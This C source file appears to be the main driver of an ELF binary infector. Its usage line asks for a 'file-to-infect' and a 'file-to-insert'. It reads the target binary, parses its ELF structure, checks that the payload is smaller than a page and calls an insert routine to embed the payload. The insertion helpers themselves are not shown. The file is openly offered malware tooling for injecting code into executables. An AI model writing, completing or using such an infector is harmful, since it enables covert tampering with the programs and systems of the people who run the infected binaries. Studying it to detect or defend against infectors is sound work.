#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <elf.h>

#include <log.h>

#include "config.h"
#include "elf-parser.h"
#include "utils.h"
#include "insertion.h"

int main(int argc, char **argv)
{
    byte *to_infect_content = NULL;
    uint64_t to_infect_size;
    byte *payload = NULL;
    uint64_t payload_size;

    // We check if the usage is correct
    if (argc != EXPECTED_ARGC) {
	fprintf(stderr, "Usage: %s <file-to-infect> <file-to-insert>", argv[0]);
	exit(EXIT_FAILURE);
    }

    to_infect_content = read_file(argv[1], &to_infect_size);
    SUCCESS("Size of target %s : 0x%x", argv[1], to_infect_size);
    setup_elf(to_infect_content);
    payload = read_file(argv[2], &payload_size);
    SUCCESS("Size of the payload %s : 0x%x", argv[2], payload_size);

    if (payload_size >= PAGE_SIZE) {
	ERROR("The payload should have a size less than 0x%x", PAGE_SIZE);
    }

    check_payload_place(payload_size);

    insert(to_infect_content, payload, to_infect_size, payload_size);

    return EXIT_SUCCESS;
}
